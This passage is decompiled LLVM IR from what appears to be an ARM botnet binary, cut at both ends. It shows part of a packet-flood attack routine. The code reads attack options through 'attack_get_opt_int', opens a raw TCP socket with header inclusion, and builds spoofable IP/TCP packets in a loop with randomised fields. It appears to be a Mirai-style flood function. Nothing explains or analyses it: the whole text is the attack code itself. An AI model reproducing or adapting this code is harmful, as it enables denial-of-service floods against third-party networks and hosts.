  store i32 %v0_8a08, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v8_8a04, i32* %fp.global-to-local, align 4
  %v0_8a18 = load i32, i32* @r4, align 4
  store i32 %v0_8a18, i32* %r0.global-to-local, align 4
  %v5_8a1c = inttoptr i32 %v0_8a08 to i32*
  %v6_8a1c = call i32 @attack_get_opt_int(i32 %v0_8a18, i32* %v5_8a1c, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_8a24 = urem i32 %v6_8a1c, 256
  store i32 %v1_8a24, i32* %ip.global-to-local, align 4
  %v0_8a28 = load i32, i32* @r5, align 4
  store i32 %v0_8a28, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8a34 = load i32, i32* @r4, align 4
  store i32 %v0_8a34, i32* %r0.global-to-local, align 4
  %v6_8a3c = inttoptr i32 %v0_8a28 to i32*
  %v7_8a3c = call i32 @attack_get_opt_int(i32 %v0_8a34, i32* %v6_8a3c, i32 5, i32 1, i32 %v1_8a24)
  %v1_8a48 = urem i32 %v7_8a3c, 256
  store i32 %v1_8a48, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_8a54 = load i32, i32* @r5, align 4
  store i32 %v0_8a54, i32* %r1.global-to-local, align 4
  %v0_8a58 = load i32, i32* @r4, align 4
  store i32 %v0_8a58, i32* %r0.global-to-local, align 4
  %v6_8a60 = inttoptr i32 %v0_8a54 to i32*
  %v7_8a60 = call i32 @attack_get_opt_int(i32 %v0_8a58, i32* %v6_8a60, i32 6, i32 sext (i16 ptrtoint (i16* @global_var_ffff.60 to i16) to i32), i32 %v1_8a48)
  %v0_8a68 = load i32, i32* @r5, align 4
  store i32 %v0_8a68, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v7_8a60, i32* @r8, align 4
  %v0_8a78 = load i32, i32* @r4, align 4
  store i32 %v0_8a78, i32* %r0.global-to-local, align 4
  %v6_8a7c = inttoptr i32 %v0_8a68 to i32*
  %v7_8a7c = call i32 @attack_get_opt_int(i32 %v0_8a78, i32* %v6_8a7c, i32 7, i32 sext (i16 ptrtoint (i16* @global_var_ffff.60 to i16) to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8a80 = load i32, i32* @r5, align 4
  store i32 %v0_8a80, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v7_8a7c, i32* @r7, align 4
  %v0_8a90 = load i32, i32* @r4, align 4
  store i32 %v0_8a90, i32* %r0.global-to-local, align 4
  %v5_8a94 = inttoptr i32 %v0_8a80 to i32*
  %v6_8a94 = call i32 @attack_get_opt_int(i32 %v0_8a90, i32* %v5_8a94, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8aa4 = load i32, i32* @r5, align 4
  store i32 %v0_8aa4, i32* %r1.global-to-local, align 4
  %v0_8aa8 = load i32, i32* @r4, align 4
  store i32 %v0_8aa8, i32* %r0.global-to-local, align 4
  %v5_8aac = inttoptr i32 %v0_8aa4 to i32*
  %v6_8aac = call i32 @attack_get_opt_int(i32 %v0_8aa8, i32* %v5_8aac, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_8ab4 = urem i32 %v6_8aac, 256
  store i32 %v1_8ab4, i32* %ip.global-to-local, align 4
  %v0_8ab8 = load i32, i32* @r5, align 4
  store i32 %v0_8ab8, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_8ac4 = load i32, i32* @r4, align 4
  store i32 %v0_8ac4, i32* %r0.global-to-local, align 4
  %v5_8acc = inttoptr i32 %v0_8ab8 to i32*
  %v6_8acc = call i32 @attack_get_opt_int(i32 %v0_8ac4, i32* %v5_8acc, i32 19, i32 0, i32 %v1_8ab4)
  %v0_8ad4 = load i32, i32* @r5, align 4
  store i32 %v0_8ad4, i32* %r1.global-to-local, align 4
  %v2_8ad8 = load i32, i32* @global_var_24f10.62, align 4
  store i32 %v2_8ad8, i32* %r3.global-to-local, align 4
  store i32 %v6_8acc, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_8ae4 = load i32, i32* @r4, align 4
  store i32 %v0_8ae4, i32* %r0.global-to-local, align 4
  %v5_8ae8 = inttoptr i32 %v0_8ad4 to i32*
  %v6_8ae8 = call i32 @attack_get_opt_int(i32 %v0_8ae4, i32* %v5_8ae8, i32 25, i32 %v2_8ad8, i32 ptrtoint (i32* @0 to i32))
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_8afc = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_8afc, i32* %r0.global-to-local, align 4
  %v7_8b00 = icmp eq i32 %v3_8afc, -1
  store i1 %v7_8b00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8b00, label %dec_label_pc_9014, label %dec_label_pc_8b0c

dec_label_pc_8b0c:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_8b14 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_8b14, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_8b28 = call i32 @__GI_setsockopt(i32 %v3_8afc, i32 0, i32 3, i32 %v6_8b14, i32 4)
  store i32 %v5_8b28, i32* %r0.global-to-local, align 4
  %v7_8b2c = icmp eq i32 %v5_8b28, -1
  store i1 %v7_8b2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8b2c, label %dec_label_pc_900c, label %dec_label_pc_8b34

dec_label_pc_8b34:                                ; preds = %dec_label_pc_8b0c
  %v0_8b34 = load i32, i32* @r8, align 4
  %v0_8b38 = load i32, i32* @r7, align 4
  %v0_8b3c = load i32, i32* %fp.global-to-local, align 4
  %v0_8b40 = load i32, i32* @r6, align 4
  %v1_8b40 = urem i32 %v0_8b40, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_8b48 = urem i32 %v0_8b34, 65536
  store i32 %v3_8b48, i32* %r3.global-to-local, align 4
  %v3_8b4c = urem i32 %v0_8b38, 65536
  store i32 %v3_8b4c, i32* %r4.global-to-local, align 4
  %v0_8b50 = load i32, i32* @sl, align 4
  %v2_8b50 = icmp eq i32 %v0_8b50, 0
  store i1 %v2_8b50, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_8b68 = urem i32 %v0_8b3c, 65536
  store i32 %v3_8b68, i32* @fp, align 4
  br i1 %v2_8b50, label %dec_label_pc_9020, label %dec_label_pc_8b78

dec_label_pc_8b78:                                ; preds = %dec_label_pc_8b34
  %v3_8b38 = mul i32 %v0_8b38, 65536
  %v3_8b34 = mul i32 %v0_8b34, 65536
  %v0_8b3c.not = or i32 %v0_8b3c, -65536
  %v1_8b7c = xor i32 %v0_8b3c.not, 65535
  %v3_8b80 = mul i32 %v6_8a94, 65536
  %v1_8b84 = add i32 %v3_8b80, 4325376
  %tmp73 = udiv i32 %v1_8b84, 256
  %v3_8b98 = and i32 %tmp73, 65280
  %tmp74 = mul nsw i32 %v1_8b7c, 256
  %v3_8b9c = and i32 %tmp74, 65280
  store i32 %v3_8b9c, i32* %ip.global-to-local, align 4
  %v1_8ba0 = add i32 %v3_8b80, 524288
  %v1_8ba8 = add i32 %v3_8b80, 1835008
  %tmp75 = udiv i32 %v1_8b7c, 256
  %v4_8bac = urem i32 %tmp75, 256
  %v5_8bac = or i32 %v4_8bac, %v3_8b9c
  %v4_8bb4 = udiv i32 %v1_8b84, 16777216
  %v5_8bb4 = or i32 %v3_8b98, %v4_8bb4
  store i32 %v5_8bb4, i32* @r8, align 4
  %v3_8bc0 = udiv i32 %v1_8ba8, 256
  %tmp76 = mul i32 %v0_8b3c, 256
  %v3_8bc4 = and i32 %tmp76, 65280
  store i32 %v3_8b34, i32* %r2.global-to-local, align 4
  %tmp77 = udiv i32 %v0_8b3c, 256
  %v4_8bd4 = urem i32 %tmp77, 256
  %v5_8bd4 = or i32 %v4_8bd4, %v3_8bc4
  store i32 %v5_8bd4, i32* %r0.global-to-local, align 4
  %tmp78 = mul i32 %v0_8b34, 256
  %v3_8bd8 = and i32 %tmp78, 65280
  %v1_8bdc = and i32 %v3_8bc0, 65280
  store i32 %v1_8bdc, i32* @r6, align 4
  store i32 %v3_8b38, i32* %r1.global-to-local, align 4
  %tmp79 = mul i32 %v0_8b38, 256
  %v3_8be8 = and i32 %tmp79, 65280
  %tmp80 = udiv i32 %v0_8b34, 256
  %v4_8bec = urem i32 %tmp80, 256
  %v5_8bec = or i32 %v4_8bec, %v3_8bd8
  store i32 %v5_8bec, i32* @lr, align 4
  %v4_8bf0 = udiv i32 %v1_8ba8, 16777216
  %v5_8bf0 = or i32 %v1_8bdc, %v4_8bf0
  store i32 %v5_8bf0, i32* %r3.global-to-local, align 4
  %tmp81 = udiv i32 %v0_8b38, 256
  %v4_8bf4 = urem i32 %tmp81, 256
  %v5_8bf4 = or i32 %v4_8bf4, %v3_8be8
  %tmp82 = udiv i32 %v1_8ba0, 256
  %v3_8bf8 = and i32 %tmp82, 65280
  store i32 %v3_8bf8, i32* @r5, align 4
  %v5_8bfc = trunc i32 %v5_8bd4 to i16
  %v5_8c04 = trunc i32 %v5_8bf0 to i16
  %v4_8c0c = udiv i32 %v1_8ba0, 16777216
  %v5_8c0c = or i32 %v3_8bf8, %v4_8c0c
  store i32 %v5_8c0c, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %v1_8c74 = trunc i32 %v6_8a1c to i8
  %sext = mul nuw i32 %v5_8bac, 65536
  %v4_8d00 = sdiv i32 %sext, 65536
  %v2_8d2c = icmp eq i32 %v1_8b40, 0
  %sext8 = mul nuw i32 %v5_8bec, 65536
  %v4_8d4c = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_8bf4, 65536
  %v4_8d54 = sdiv i32 %sext9, 65536
  %v1_8d0c27 = trunc i32 %v4_8d00 to i16
  br label %dec_label_pc_8c14

dec_label_pc_8c14:                                ; preds = %bb85, %dec_label_pc_8b78
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_8c20 = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_8c20, i32* %r0.global-to-local, align 4
  %v2_8c28 = load i32, i32* @r4, align 4
  %v5_8c28 = mul i32 %v2_8c28, 4
  %v6_8c28 = add i32 %v5_8c28, %v2_89c8
  %v7_8c28 = inttoptr i32 %v6_8c28 to i32*
  store i32 %v2_8c20, i32* %v7_8c28, align 4
  %v3_8c2c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8c2c, i32* %r2.global-to-local, align 4
  %v5_8c34 = mul i32 %v3_8c2c, 24
  %v1_8c38 = load i32, i32* @sb, align 4
  %v2_8c38 = add i32 %v1_8c38, %v5_8c34
  store i32 %v2_8c38, i32* @lr, align 4
  store i32 %v2_89c8, i32* %r3.global-to-local, align 4
  %v4_8c40 = mul i32 %v3_8c2c, 4
  %v5_8c40 = add i32 %v4_8c40, %v2_89c8
  %v6_8c40 = inttoptr i32 %v5_8c40 to i32*
  %v7_8c40 = load i32, i32* %v6_8c40, align 4
  store i32 %v7_8c40, i32* %r4.global-to-local, align 4
  %v1_8c44 = inttoptr i32 %v7_8c40 to i8*
  %v2_8c44 = load i8, i8* %v1_8c44, align 1
  %tmp = urem i8 %v2_8c44, 16
  %v1_8c48 = zext i8 %tmp to i32
  %v1_8c4c = or i32 %v1_8c48, 64
  store i32 %v1_8c4c, i32* %r3.global-to-local, align 4
  %v1_8c50 = trunc i32 %v1_8c4c to i8
  store i8 %v1_8c50, i8* %v1_8c44, align 1
  %v0_8c54 = load i32, i32* %r4.global-to-local, align 4
  %v1_8c54 = inttoptr i32 %v0_8c54 to i8*
  %v2_8c54 = load i8, i8* %v1_8c54, align 1
  %v1_8c58 = and i8 %v2_8c54, -16
  %v1_8c5c = or i8 %v1_8c58, 5
  store i32 %v1_8a48, i32* %r5.global-to-local, align 4
  store i8 %v1_8c5c, i8* %v1_8c54, align 1
  store i32 %v6_89e0, i32* %r1.global-to-local, align 4
  %v2_8c6c = load i32, i32* %r4.global-to-local, align 4
  %v3_8c6c = add i32 %v2_8c6c, 1
  %v4_8c6c = inttoptr i32 %v3_8c6c to i8*
  store i8 %v5_8a00, i8* %v4_8c6c, align 1
  store i32 %v1_8a24, i32* %r2.global-to-local, align 4
  %v2_8c74 = load i32, i32* %r4.global-to-local, align 4
  %v3_8c74 = add i32 %v2_8c74, 8
  %v4_8c74 = inttoptr i32 %v3_8c74 to i8*
  store i8 %v1_8c74, i8* %v4_8c74, align 1
  %v2_8c7c = load i32, i32* %r4.global-to-local, align 4
  %v3_8c7c = add i32 %v2_8c7c, 4
  %v4_8c7c = inttoptr i32 %v3_8c7c to i16*
  store i16 %v5_8bfc, i16* %v4_8c7c, align 2
  %v2_8c84 = load i32, i32* %r4.global-to-local, align 4
  %v3_8c84 = add i32 %v2_8c84, 9
  %v4_8c84 = inttoptr i32 %v3_8c84 to i8*
  store i8 47, i8* %v4_8c84, align 1
  store i32 %v6_8ae8, i32* %r3.global-to-local, align 4
  %v0_8c8c = load i32, i32* %r5.global-to-local, align 4
  %v2_8c8c = icmp eq i32 %v0_8c8c, 0
  store i1 %v2_8c8c, i1* %cpsr_z.global-to-local, align 1
  %v1_8c90 = load i32, i32* %r4.global-to-local, align 4
  %v2_8c90 = add i32 %v1_8c90, 12
  %v3_8c90 = inttoptr i32 %v2_8c90 to i32*
  store i32 %v6_8ae8, i32* %v3_8c90, align 4
  br i1 %v2_8c8c, label %.thread25, label %bb

bb:                                               ; preds = %dec_label_pc_8c14
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_8c98 = load i32, i32* %r4.global-to-local, align 4
  %v4_8c98 = add i32 %v3_8c98, 6
  %v5_8c98 = inttoptr i32 %v4_8c98 to i16*
  store i16 64, i16* %v5_8c98, align 2
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_8c14, %bb
  %v0_8c9c = load i32, i32* @lr, align 4
  %v1_8c9c = add i32 %v0_8c9c, 16
  %v2_8c9c = inttoptr i32 %v1_8c9c to i32*
  %v3_8c9c = load i32, i32* %v2_8c9c, align 4
  store i32 22528, i32* %ip.global-to-local, align 4
  %v1_8ca4 = load i32, i32* %r4.global-to-local, align 4
  %v2_8ca4 = add i32 %v1_8ca4, 16
  %v3_8ca4 = inttoptr i32 %v2_8ca4 to i32*
  store i32 %v3_8c9c, i32* %v3_8ca4, align 4
  %v0_8ca8 = load i32, i32* %r4.global-to-local, align 4
  %v1_8ca8 = add i32 %v0_8ca8, 24
  store i32 %v1_8ca8, i32* %r1.global-to-local, align 4
  %v1_8cac = add i32 %v0_8ca8, 20
  store i32 %v1_8cac, i32* %r0.global-to-local, align 4
  %v0_8cb0 = load i32, i32* %ip.global-to-local, align 4
  %v1_8cb0 = add i32 %v0_8cb0, 101
  store i32 %v1_8cb0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v0_8cbc = load i32, i32* @r8, align 4
  %v1_8cbc = trunc i32 %v0_8cbc to i16
  %v3_8cbc = add i32 %v0_8ca8, 2
  %v4_8cbc = inttoptr i32 %v3_8cbc to i16*
  store i16 %v1_8cbc, i16* %v4_8cbc, align 2
  %v0_8cc0 = load i32, i32* %ip.global-to-local, align 4
  %v1_8cc0 = trunc i32 %v0_8cc0 to i16
  %v2_8cc0 = load i32, i32* %r0.global-to-local, align 4
  %v3_8cc0 = add i32 %v2_8cc0, 2
  %v4_8cc0 = inttoptr i32 %v3_8cc0 to i16*
  store i16 %v1_8cc0, i16* %v4_8cc0, align 2
  %v0_8cc4 = load i32, i32* %r3.global-to-local, align 4
  %v1_8cc4 = trunc i32 %v0_8cc4 to i8
  %v2_8cc4 = load i32, i32* %r1.global-to-local, align 4
  %v3_8cc4 = add i32 %v2_8cc4, 13
  %v4_8cc4 = inttoptr i32 %v3_8cc4 to i8*
  store i8 %v1_8cc4, i8* %v4_8cc4, align 1
  %v0_8cc8 = load i32, i32* %r2.global-to-local, align 4
  %v1_8cc8 = trunc i32 %v0_8cc8 to i8
  %v2_8cc8 = load i32, i32* %r1.global-to-local, align 4
  %v3_8cc8 = add i32 %v2_8cc8, 12
  %v4_8cc8 = inttoptr i32 %v3_8cc8 to i8*
  store i8 %v1_8cc8, i8* %v4_8cc8, align 1
  %v0_8ccc = load i32, i32* %r4.global-to-local, align 4
  %v1_8ccc = add i32 %v0_8ccc, 38
  %v2_8ccc = inttoptr i32 %v1_8ccc to i8*
  %v3_8ccc = load i8, i8* %v2_8ccc, align 1
  %tmp87 = urem i8 %v3_8ccc, 16
  %v1_8cd0 = zext i8 %tmp87 to i32
  %v1_8cd4 = or i32 %v1_8cd0, 64
  store i32 %v1_8cd4, i32* %r3.global-to-local, align 4
  %v1_8cd8 = trunc i32 %v1_8cd4 to i8
  store i8 %v1_8cd8, i8* %v2_8ccc, align 1
  %v0_8cdc = load i32, i32* %r4.global-to-local, align 4
  %v1_8cdc = add i32 %v0_8cdc, 38
  %v2_8cdc = inttoptr i32 %v1_8cdc to i8*
  %v3_8cdc = load i8, i8* %v2_8cdc, align 1
  %v1_8ce0 = and i8 %v3_8cdc, -16
  %v1_8ce4 = or i8 %v1_8ce0, 5
  store i8 %v1_8ce4, i8* %v2_8cdc, align 1
  %v0_8cf0 = load i32, i32* %r4.global-to-local, align 4
  %v1_8cf0 = add i32 %v0_8cf0, 38
  store i32 %v1_8cf0, i32* @r5, align 4
  %v3_8cf4 = add i32 %v0_8cf0, 39
  %v4_8cf4 = inttoptr i32 %v3_8cf4 to i8*
  store i8 %v5_8a00, i8* %v4_8cf4, align 1
  store i32 %v5_8bf0, i32* %r2.global-to-local, align 4
  %v2_8cfc = load i32, i32* @r5, align 4
  %v3_8cfc = add i32 %v2_8cfc, 2
  %v4_8cfc = inttoptr i32 %v3_8cfc to i16*
  store i16 %v5_8c04, i16* %v4_8cfc, align 2
  store i32 %v4_8d00, i32* %r3.global-to-local, align 4
  store i32 %v1_8a24, i32* %r1.global-to-local, align 4
  %v0_8d08 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8d08, label %.thread26, label %bb83

.thread26:                                        ; preds = %.thread25
  %v2_8d0c28 = load i32, i32* @r5, align 4
  %v3_8d0c29 = add i32 %v2_8d0c28, 4
  %v4_8d0c30 = inttoptr i32 %v3_8d0c29 to i16*
  store i16 %v1_8d0c27, i16* %v4_8d0c30, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  br label %bb84

bb83:                                             ; preds = %.thread25
  store i32 64, i32* %r2.global-to-local, align 4
  %v2_8d0c = load i32, i32* @r5, align 4
  %v3_8d0c = add i32 %v2_8d0c, 4
  %v4_8d0c = inttoptr i32 %v3_8d0c to i16*
  store i16 %v1_8d0c27, i16* %v4_8d0c, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  %v1_8d14 = load i32, i32* %r2.global-to-local, align 4
  %v2_8d14 = trunc i32 %v1_8d14 to i16
  %v3_8d14 = load i32, i32* @r5, align 4
  %v4_8d14 = add i32 %v3_8d14, 6
  %v5_8d14 = inttoptr i32 %v4_8d14 to i16*
  store i16 %v2_8d14, i16* %v5_8d14, align 2
  br label %bb84

bb84:                                             ; preds = %.thread26, %bb83
  %v0_8d18 = load i32, i32* %r1.global-to-local, align 4
  %v1_8d18 = trunc i32 %v0_8d18 to i8
  %v2_8d18 = load i32, i32* @r5, align 4
  %v3_8d18 = add i32 %v2_8d18, 8
  %v4_8d18 = inttoptr i32 %v3_8d18 to i8*
  store i8 %v1_8d18, i8* %v4_8d18, align 1
  %v0_8d1c = load i32, i32* %r3.global-to-local, align 4
  %v1_8d1c = trunc i32 %v0_8d1c to i8
  %v2_8d1c = load i32, i32* @r5, align 4
  %v3_8d1c = add i32 %v2_8d1c, 9
  %v4_8d1c = inttoptr i32 %v3_8d1c to i8*
  store i8 %v1_8d1c, i8* %v4_8d1c, align 1
  %v0_8d20 = call i32 @rand_next()
  store i32 %v0_8d20, i32* %r0.global-to-local, align 4
  store i32 %v1_8b40, i32* %r1.global-to-local, align 4
  store i1 %v2_8d2c, i1* %cpsr_z.global-to-local, align 1
  %v1_8d30 = sub i32 1023, %v0_8d20
  store i32 %v1_8d30, i32* %r3.global-to-local, align 4
  br i1 %v2_8d2c, label %.thread, label %.thread10

.thread:                                          ; preds = %bb84
  %v2_8d38 = load i32, i32* @r5, align 4
  %v3_8d38 = add i32 %v2_8d38, 16
  %v4_8d38 = inttoptr i32 %v3_8d38 to i32*
  store i32 %v1_8d30, i32* %v4_8d38, align 4
  br label %bb85

.thread10:                                        ; preds = %bb84
  %v1_8d34 = load i32, i32* %r4.global-to-local, align 4
  %v2_8d34 = add i32 %v1_8d34, 16
  %v3_8d34 = inttoptr i32 %v2_8d34 to i32*
  %v4_8d34 = load i32, i32* %v3_8d34, align 4
  store i32 %v4_8d34, i32* %r3.global-to-local, align 4
  %v2_8d3c = load i32, i32* @r5, align 4
  %v3_8d3c = add i32 %v2_8d3c, 16
  %v4_8d3c = inttoptr i32 %v3_8d3c to i32*
  store i32 %v4_8d34, i32* %v4_8d3c, align 4
  br label %bb85

bb85:                                             ; preds = %.thread, %.thread10
  %v1_8d40 = load i32, i32* @r5, align 4
  %v2_8d40 = add i32 %v1_8d40, 12
  %v3_8d40 = inttoptr i32 %v2_8d40 to i32*
  store i32 %v0_8d20, i32* %v3_8d40, align 4
  %v3_8d44 = load i32, i32* %stack_var_-44, align 4
  %v0_8d48 = load i32, i32* %r4.global-to-local, align 4
  %v1_8d48 = add i32 %v0_8d48, 58
  store i32 %v1_8d48, i32* @r6, align 4
  store i32 %v4_8d4c, i32* %r2.global-to-local, align 4
  %v1_8d50 = add i32 %v3_8d44, 1
  store i32 %v1_8d50, i32* @r4, align 4
  store i32 %v4_8d54, i32* %r3.global-to-local, align 4
  %v1_8d58 = load i32, i32* @sl, align 4
  %v9_8d58 = icmp eq i32 %v1_8d50, %v1_8d58
  store i1 %v9_8d58, i1* %cpsr_z.global-to-local, align 1
  %v0_8d5c = load i32, i32* @r7, align 4
  %v1_8d5c = trunc i32 %v0_8d5c to i16
  %v3_8d5c = add i32 %v0_8d48, 62
  %v4_8d5c = inttoptr i32 %v3_8d5c to i16*
  store i16 %v1_8d5c, i16* %v4_8d5c, align 2
  %v0_8d60 = load i32, i32* %r2.global-to-local, align 4
  %v1_8d60 = trunc i32 %v0_8d60 to i16
  %v2_8d60 = load i32, i32* @r6, align 4
  %v3_8d60 = inttoptr i32 %v2_8d60 to i16*
  store i16 %v1_8d60, i16* %v3_8d60, align 2
  %v0_8d64 = load i32, i32* %r3.global-to-local, align 4
  %v1_8d64 = trunc i32 %v0_8d64 to i16
  %v2_8d64 = load i32, i32* @r6, align 4
  %v3_8d64 = add i32 %v2_8d64, 2
  %v4_8d64 = inttoptr i32 %v3_8d64 to i16*
  store i16 %v1_8d64, i16* %v4_8d64, align 2
  %v0_8d68 = load i32, i32* @r4, align 4
  store i32 %v0_8d68, i32* %stack_var_-44, align 4
  %v5_8d6c = icmp slt i32 %v1_8d50, %v1_8d58
  br i1 %v5_8d6c, label %dec_label_pc_8c14, label %dec_label_pc_8d70

dec_label_pc_8d70:                                ; preds = %bb85
  %v1_8d78 = add i32 %v6_8a94, 8
  store i32 %v1_8d78, i32* %r4.global-to-local, align 4
  %v1_8d7c = add i32 %v6_8a94, 66
  store i32 %v1_8d7c, i32* %r5.global-to-local, align 4
  %v0_8d8c.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_8d88.preheader

dec_label_pc_8d88.preheader:                      ; preds = %dec_label_pc_8d70, %dec_label_pc_9020
  %v0_8d8c.pre = phi i32 [ %v0_8d8c.pre.pre, %dec_label_pc_8d70 ], [ 0, %dec_label_pc_9020 ]
  %stack_var_-132.0.ph = phi i32 [ %v1_8d7c, %dec_label_pc_8d70 ], [ %v1_902c, %dec_label_pc_9020 ]
  %stack_var_-136.0.ph = phi i32 [ %v1_8d78, %dec_label_pc_8d70 ], [ %v1_9028, %dec_label_pc_9020 ]
  %v2_8fdc = icmp eq i32 %v1_8b40, 0
  %v2_8e24 = ptrtoint i32* %stack_var_-48 to i32
  %v2_8e3c = ptrtoint i32* %stack_var_-52 to i32
  %v2_8e4c = ptrtoint i32* %stack_var_-56 to i32
  %v2_8e58 = ptrtoint i32* %stack_var_-54 to i32
  %v2_8e6c = icmp eq i32 %v1_8ab4, 0
  %v2_8dcc = icmp eq i32 %v6_8ae8, -1
  %v7_8dcc = icmp eq i32 %v6_8ae8, -1
  br label %dec_label_pc_8d88

dec_label_pc_8d88:                                ; preds = %dec_label_pc_8d88, %dec_label_pc_8e74, %dec_label_pc_8d88.preheader
  %v0_8d8c = phi i32 [ %v0_8d8c.pre, %dec_label_pc_8d88.preheader ], [ 0, %dec_label_pc_8d88 ], [ %v1_8f10, %dec_label_pc_8e74 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_8d8c = icmp eq i32 %v0_8d8c, 0
  store i1 %v2_8d8c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_8d8c, label %dec_label_pc_8d88, label %dec_label_pc_8d98

dec_label_pc_8d98:                                ; preds = %dec_label_pc_8d88
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8d9c

dec_label_pc_8d9c:                                ; preds = %dec_label_pc_8e74, %dec_label_pc_8d98
  %v1_8db0 = phi i32 [ %v1_8f0c, %dec_label_pc_8e74 ], [ 0, %dec_label_pc_8d98 ]
  %v5_8da0 = mul i32 %v1_8db0, 24
  %v1_8da4 = load i32, i32* @sb, align 4
  %v2_8da4 = add i32 %v1_8da4, %v5_8da0
  store i32 %v2_8da4, i32* %r3.global-to-local, align 4
  store i32 %v2_89c8, i32* %r4.global-to-local, align 4
  %v1_8dac = add i32 %v2_8da4, 20
  %v2_8dac = inttoptr i32 %v1_8dac to i8*
  %v3_8dac = load i8, i8* %v2_8dac, align 1
  %v4_8dac = zext i8 %v3_8dac to i32
  store i32 %v4_8dac, i32* %r2.global-to-local, align 4
  %v4_8db0 = mul i32 %v1_8db0, 4
  %v5_8db0 = add i32 %v4_8db0, %v2_89c8
  %v6_8db0 = inttoptr i32 %v5_8db0 to i32*
  %v7_8db0 = load i32, i32* %v6_8db0, align 4
  store i32 %v7_8db0, i32* @r5, align 4
  %v7_8db4 = icmp eq i8 %v3_8dac, 31
  store i1 %v7_8db4, i1* %cpsr_z.global-to-local, align 1
  %v1_8db8 = add i32 %v7_8db0, 24
  store i32 %v1_8db8, i32* @r7, align 4
  %v1_8dbc = add i32 %v7_8db0, 38
  store i32 %v1_8dbc, i32* @r6, align 4
  %v1_8dc0 = add i32 %v7_8db0, 58
  store i32 %v1_8dc0, i32* @r8, align 4
  %tmp88 = icmp ult i8 %v3_8dac, 32
  br i1 %tmp88, label %dec_label_pc_8f20, label %dec_label_pc_8dc8

dec_label_pc_8dc8:                                ; preds = %dec_label_pc_8d9c
  store i32 %v6_8ae8, i32* %r1.global-to-local, align 4
  store i1 %v7_8dcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8dcc, label %dec_label_pc_8f80, label %dec_label_pc_8dd4

dec_label_pc_8dd4:                                ; preds = %dec_label_pc_8f20, %dec_label_pc_8dc8
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r4.global-to-local, align 4
  %v0_8ddc = load i32, i32* @fp, align 4
  %v9_8ddc = icmp eq i32 %v0_8ddc, ptrtoint (i16* @global_var_ffff.60 to i32)
  store i1 %v9_8ddc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8ddc, label %dec_label_pc_8f98, label %dec_label_pc_8de4

dec_label_pc_8de4:                                ; preds = %dec_label_pc_8f80.dec_label_pc_8de4_crit_edge, %dec_label_pc_8dd4
  %v1_8de8 = phi i32 [ %v1_8de8.pre, %dec_label_pc_8f80.dec_label_pc_8de4_crit_edge ], [ ptrtoint (i16* @global_var_ffff.60 to i32), %dec_label_pc_8dd4 ]
  store i32 %v3_8b48, i32* %r2.global-to-local, align 4
  %v9_8de8 = icmp eq i32 %v3_8b48, %v1_8de8
  store i1 %v9_8de8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8de8, label %dec_label_pc_8fc0, label %dec_label_pc_8df0

dec_label_pc_8df0:                                ; preds = %dec_label_pc_8f98.dec_label_pc_8df0_crit_edge, %dec_label_pc_8de4
  %v1_8df4 = phi i32 [ %v1_8df4.pre, %dec_label_pc_8f98.dec_label_pc_8df0_crit_edge ], [ %v1_8de8, %dec_label_pc_8de4 ]
  store i32 %v3_8b4c, i32* %r3.global-to-local, align 4
  %v9_8df4 = icmp eq i32 %v3_8b4c, %v1_8df4
  store i1 %v9_8df4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8df4, label %dec_label_pc_8fd4, label %dec_label_pc_8dfc

